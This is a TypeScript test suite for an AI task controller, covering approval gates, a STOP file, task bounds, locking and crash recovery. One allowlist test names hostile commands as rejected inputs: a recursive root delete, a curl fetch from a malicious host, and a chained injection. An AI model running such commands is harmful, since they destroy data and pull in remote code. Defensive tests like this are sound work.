import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'fs';
import path from 'path';
import { execSync } from 'child_process';

import { BoundedOvernightController } from '@/controller/orchestrator';
import { loadControllerConfig } from '@/controller/config';
import type { ControllerConfig } from '@/controller/config';
import { MockPerplexityPlanner, PerplexityApiClient, AntigravityNativePlanner, isCommandPermitted } from '@/controller/perplexityPlanner';
import { MockAntigravityExecutor } from '@/controller/antigravityExecutor';
import { WorktreeLockManager } from '@/controller/worktreeLock';
import type { TaskDefinition } from '@/controller/types';

describe('Bounded Overnight Controller Test Suite (Perplexity + Antigravity)', () => {
  const currentBranch = (() => {
    try {
      return execSync('git branch --show-current', { stdio: 'pipe' }).toString().trim() || 'feat/cross-system-consistency';
    } catch {
      return 'feat/cross-system-consistency';
    }
  })();

  const testDir = path.join(process.cwd(), '.cache', 'controller_tests');
  const testStateFile = path.join(testDir, 'test_state.json');
  const testStopFile = path.join(testDir, 'STOP');
  const testLockFile = path.join(testDir, 'test_locks.json');
  const testSecretsFile = path.join(testDir, 'test_secrets.env');

  const baseConfig = loadControllerConfig();
  let testConfig: any;
  let lockManager: WorktreeLockManager;

  const sampleTasks: TaskDefinition[] = [
    {
      id: 'TASK-001',
      title: 'Run local test suite inspection',
      actionType: 'TEST_EXECUTION',
      assignedWorktree: process.cwd(),
      assignedBranch: currentBranch,
      targetFiles: ['src/test/baseline.test.ts'],
      dependencies: [],
      requiresApproval: false,
      verificationRules: [
        {
          command: 'npm run typecheck',
          expectedExitCode: 0,
        },
      ],
      promptContext: 'Verify that all TypeScript code passes strict typecheck.',
    },
    {
      id: 'TASK-002',
      title: 'Dependent documentation sync',
      actionType: 'DOCUMENTATION',
      assignedWorktree: process.cwd(),
      assignedBranch: currentBranch,
      targetFiles: ['docs/INTEGRATION_BOARD.md'],
      dependencies: ['TASK-001'],
      requiresApproval: false,
      verificationRules: [
        {
          command: 'git status',
          expectedExitCode: 0,
        },
      ],
      promptContext: 'Sync docs after TASK-001 is verified.',
    },
    {
      id: 'TASK-003-APPROVAL',
      title: 'High-risk deployment task',
      actionType: 'INSPECTION',
      assignedWorktree: process.cwd(),
      assignedBranch: currentBranch,
      targetFiles: [],
      dependencies: [],
      requiresApproval: true, // Requires explicit sign-off
      verificationRules: [],
      promptContext: 'Deploy to external staging.',
    },
  ];

  beforeEach(() => {
    if (!fs.existsSync(testDir)) {
      fs.mkdirSync(testDir, { recursive: true });
    }
    if (fs.existsSync(testStateFile)) fs.unlinkSync(testStateFile);
    if (fs.existsSync(testStopFile)) fs.unlinkSync(testStopFile);
    if (fs.existsSync(testLockFile)) fs.unlinkSync(testLockFile);
    if (fs.existsSync(testSecretsFile)) fs.unlinkSync(testSecretsFile);

    testConfig = {
      ...baseConfig,
      bounds: {
        maxTasks: 2,
        maxMinutes: 15,
        maxRequests: 4,
        maxSpendUsd: 1.00,
        stopFilePath: testStopFile,
        stateFilePath: testStateFile,
      },
      secretsFilePath: testSecretsFile,
    };

    lockManager = new WorktreeLockManager(testLockFile);
  });

  afterEach(() => {
    try {
      if (fs.existsSync(testStateFile)) fs.unlinkSync(testStateFile);
      if (fs.existsSync(testStopFile)) fs.unlinkSync(testStopFile);
      if (fs.existsSync(testLockFile)) fs.unlinkSync(testLockFile);
      if (fs.existsSync(testSecretsFile)) fs.unlinkSync(testSecretsFile);
    } catch {}
  });

  describe('1. Mocked Planner & Executor Happy Path', () => {
    it('executes unblocked task, verifies evidence, and respects dependency ordering', async () => {
      const mockPlanner = new MockPerplexityPlanner();
      const mockExecutor = new MockAntigravityExecutor({
        success: true,
        exitCode: 0,
        verificationOutputs: [
          {
            command: 'npm run typecheck',
            exitCode: 0,
            passed: true,
            outputSnippet: 'Found 0 errors.',
          },
        ],
      });

      const configWith3Tasks = {
        ...testConfig,
        bounds: {
          ...testConfig.bounds,
          maxTasks: 3,
        },
      };

      const controller = new BoundedOvernightController({
        config: configWith3Tasks,
        planner: mockPlanner,
        executor: mockExecutor,
        lockManager,
        initialTasks: sampleTasks,
      });

      // Run loop
      const finalState = await controller.runLoop();

      expect(finalState.metrics.tasksAttempted).toBe(2);
      expect(finalState.metrics.tasksVerified).toBe(2);

      // Verify TASK-001 was verified first
      const task1 = finalState.taskQueue.find((t) => t.task.id === 'TASK-001');
      expect(task1?.status).toBe('VERIFIED');
      expect(task1?.evidence?.exitCode).toBe(0);

      // Verify TASK-002 was verified after dependency was satisfied
      const task2 = finalState.taskQueue.find((t) => t.task.id === 'TASK-002');
      expect(task2?.status).toBe('VERIFIED');

      // Verify TASK-003 was blocked for approval and never executed
      const task3 = finalState.taskQueue.find((t) => t.task.id === 'TASK-003-APPROVAL');
      expect(task3?.status).toBe('BLOCKED_APPROVAL');

      // State was saved atomically to disk
      expect(fs.existsSync(testStateFile)).toBe(true);
    });
  });

  describe('2. Fail-Closed Credential & Output Validation', () => {
    it('fails closed when PERPLEXITY_API_KEY is not configured', async () => {
      const emptyConfig = {
        ...testConfig,
        perplexityApiKey: undefined,
      };

      const metrics = {
        tasksAttempted: 0,
        tasksVerified: 0,
        tasksFailed: 0,
        tasksBlocked: 0,
        requestsCount: 0,
        totalTokensUsed: 0,
        estimatedCostUsd: 0,
        startedAt: new Date().toISOString(),
        lastCycleAt: new Date().toISOString(),
      };

      const client = new PerplexityApiClient(emptyConfig, metrics);
      await expect(client.planTask(sampleTasks[0], 'Project Brief')).rejects.toThrowError(
        /CREDENTIALS_MISSING.*PERPLEXITY_API_KEY/
      );
    });

    it('rejects unwhitelisted or dangerous commands from planner output', () => {
      expect(isCommandPermitted('npm run typecheck')).toBe(true);
      expect(isCommandPermitted('npx vitest run src/test/baseline.test.ts')).toBe(true);
      expect(isCommandPermitted('git status --porcelain')).toBe(true);

      // Malicious or dangerous commands
      expect(isCommandPermitted('rm -rf /')).toBe(false);
      expect(isCommandPermitted('curl http://malicious.site/script.sh')).toBe(false);
      expect(isCommandPermitted('git push origin main')).toBe(false);
      expect(isCommandPermitted('deploy staging')).toBe(false);
      expect(isCommandPermitted('npm test; rm -rf .')).toBe(false); // shell injection
    });

    it('blocks execution if planner suggests dangerous unwhitelisted commands', async () => {
      const mockPlanner = new MockPerplexityPlanner({
        verificationCommands: ['rm -rf /'], // unwhitelisted!
      });
      const mockExecutor = new MockAntigravityExecutor();

      // Ensure mock planner checks command permissions
      const planned = await mockPlanner.planTask(sampleTasks[0], 'Brief');
      const hasDangerousCmd = planned.verificationCommands.some((c) => !isCommandPermitted(c));
      expect(hasDangerousCmd).toBe(true);
    });
  });

  describe('3. Concurrent Writer Mutex Prevention', () => {
    it('prevents a second worker from acquiring a lock on the same worktree', async () => {
      const worktree = process.cwd();

      // Worker 1 acquires lock
      const lock1 = await lockManager.acquireLock({
        worktreePath: worktree,
        workerId: 'worker-alpha-01',
        expectedBranch: currentBranch,
        leaseDurationMs: 60000,
        requireCleanState: false,
      });
      expect(lock1.acquired).toBe(true);

      // Worker 2 attempts concurrent lock on the same worktree
      const lock2 = await lockManager.acquireLock({
        worktreePath: worktree,
        workerId: 'worker-beta-02',
        expectedBranch: currentBranch,
        leaseDurationMs: 60000,
        requireCleanState: false,
      });
      expect(lock2.acquired).toBe(false);
      expect(lock2.error).toContain('WORKTREE_LOCKED');
      expect(lock2.error).toContain('worker-alpha-01');

      // Worker 1 releases lock
      await lockManager.releaseLock(worktree, 'worker-alpha-01');

      // Worker 2 can now acquire lock
      const lock3 = await lockManager.acquireLock({
        worktreePath: worktree,
        workerId: 'worker-beta-02',
        expectedBranch: currentBranch,
        leaseDurationMs: 60000,
        requireCleanState: false,
      });
      expect(lock3.acquired).toBe(true);
    });
  });

  describe('4. Crash & Restart Recovery', () => {
    it('reconciles tasks left in RUNNING status after an unexpected termination', async () => {
      // Create initial state with a task stuck in RUNNING
      const crashedState = {
        runId: 'run-crashed-123',
        status: 'RUNNING' as const,
        metrics: {
          tasksAttempted: 1,
          tasksVerified: 0,
          tasksFailed: 0,
          tasksBlocked: 0,
          requestsCount: 1,
          totalTokensUsed: 100,
          estimatedCostUsd: 0.001,
          startedAt: new Date().toISOString(),
          lastCycleAt: new Date().toISOString(),
        },
        taskQueue: [
          {
            task: sampleTasks[0],
            status: 'RUNNING' as const,
            attempts: 1,
            maxAttempts: 3,
            lastUpdated: new Date().toISOString(),
          },
        ],
      };

      fs.writeFileSync(testStateFile, JSON.stringify(crashedState, null, 2), 'utf-8');

      const mockPlanner = new MockPerplexityPlanner();
      const mockExecutor = new MockAntigravityExecutor();

      // Initialize new controller instance pointing to the crashed state
      const rebootedController = new BoundedOvernightController({
        config: testConfig,
        planner: mockPlanner,
        executor: mockExecutor,
        lockManager,
      });

      const restoredState = rebootedController.getState();
      const task = restoredState.taskQueue[0];

      // Reconciled to PENDING instead of blindly repeating or staying stuck in RUNNING
      expect(task.status).toBe('PENDING');
      expect(task.blockedReason).toContain('CRASH_RECOVERY');
    });
  });

  describe('5. STOP File & Hard Boundaries', () => {
    it('aborts loop cleanly when STOP file is present', async () => {
      // Touch STOP file
      fs.writeFileSync(testStopFile, 'STOP requested by operator', 'utf-8');

      const mockPlanner = new MockPerplexityPlanner();
      const mockExecutor = new MockAntigravityExecutor();

      const controller = new BoundedOvernightController({
        config: testConfig,
        planner: mockPlanner,
        executor: mockExecutor,
        lockManager,
        initialTasks: sampleTasks,
      });

      const finalState = await controller.runLoop();
      expect(finalState.status).toBe('STOPPED');
      expect(finalState.stopReason).toContain('STOP_FILE_DETECTED');
      expect(finalState.metrics.tasksAttempted).toBe(0);
    });

    it('enforces task count ceiling strictly (maxTasks = 1)', async () => {
      const tightConfig = {
        ...testConfig,
        bounds: {
          ...testConfig.bounds,
          maxTasks: 1, // Only allow 1 task
        },
      };

      const mockPlanner = new MockPerplexityPlanner();
      const mockExecutor = new MockAntigravityExecutor();

      const controller = new BoundedOvernightController({
        config: tightConfig,
        planner: mockPlanner,
        executor: mockExecutor,
        lockManager,
        initialTasks: sampleTasks,
      });

      const finalState = await controller.runLoop();
      expect(finalState.metrics.tasksAttempted).toBe(1);
      expect(finalState.status).toBe('STOPPED');
      expect(finalState.stopReason).toContain('BOUND_REACHED');
    });
  });

  describe('6. Antigravity-Native & Fallback Planning Mode', () => {
    it('AntigravityNativePlanner plans tasks deterministically without external credentials', async () => {
      const nativePlanner = new AntigravityNativePlanner();
      const plan = await nativePlanner.planTask(sampleTasks[0], 'Project Brief');

      expect(plan.taskId).toBe('TASK-001');
      expect(plan.approvedToExecute).toBe(true);
      expect(plan.strategyExplanation).toContain('Antigravity Native Planner');
      expect(plan.verificationCommands).toContain('npm run typecheck');
      expect(plan.filesToInspect).toEqual(['src/test/baseline.test.ts']);
      expect(plan.requiresHumanApproval).toBe(false);
    });

    it('runs BoundedOvernightController in Antigravity-only mode without PERPLEXITY_API_KEY', async () => {
      const antigravityOnlyConfig = {
        ...testConfig,
        perplexityApiKey: undefined,
        plannerMode: 'ANTIGRAVITY_NATIVE' as const,
      };

      const mockExecutor = new MockAntigravityExecutor({
        success: true,
        exitCode: 0,
        verificationOutputs: [
          {
            command: 'npm run typecheck',
            exitCode: 0,
            passed: true,
            outputSnippet: 'Found 0 errors.',
          },
        ],
      });

      // Controller initialized WITHOUT explicit planner; defaults to AntigravityNativePlanner
      const controller = new BoundedOvernightController({
        config: antigravityOnlyConfig,
        executor: mockExecutor,
        lockManager,
        initialTasks: [sampleTasks[0]],
      });

      const finalState = await controller.runLoop();
      expect(finalState.metrics.tasksAttempted).toBe(1);
      expect(finalState.metrics.tasksVerified).toBe(1);
      expect(finalState.metrics.tasksFailed).toBe(0);

      const verifiedTask = finalState.taskQueue.find((t) => t.task.id === 'TASK-001');
      expect(verifiedTask?.status).toBe('VERIFIED');
      expect(verifiedTask?.evidence?.plannerNotes).toContain('Antigravity Native Planner');
    });

    it('falls back to AntigravityNativePlanner when external planner throws CREDENTIALS_MISSING', async () => {
      const failingPerplexityClient = {
        planTask: async () => {
          throw new Error('CREDENTIALS_MISSING: PERPLEXITY_API_KEY is not configured.');
        },
      };

      const mockExecutor = new MockAntigravityExecutor({
        success: true,
        exitCode: 0,
      });

      const controller = new BoundedOvernightController({
        config: testConfig,
        planner: failingPerplexityClient,
        executor: mockExecutor,
        lockManager,
        initialTasks: [sampleTasks[0]],
      });

      const finalState = await controller.runLoop();
      // Should NOT fail the task; should gracefully fallback to AntigravityNativePlanner
      expect(finalState.metrics.tasksVerified).toBe(1);
      const verifiedTask = finalState.taskQueue.find((t) => t.task.id === 'TASK-001');
      expect(verifiedTask?.status).toBe('VERIFIED');
      expect(verifiedTask?.evidence?.plannerNotes).toContain('Antigravity Native Planner');
    });
  });
});
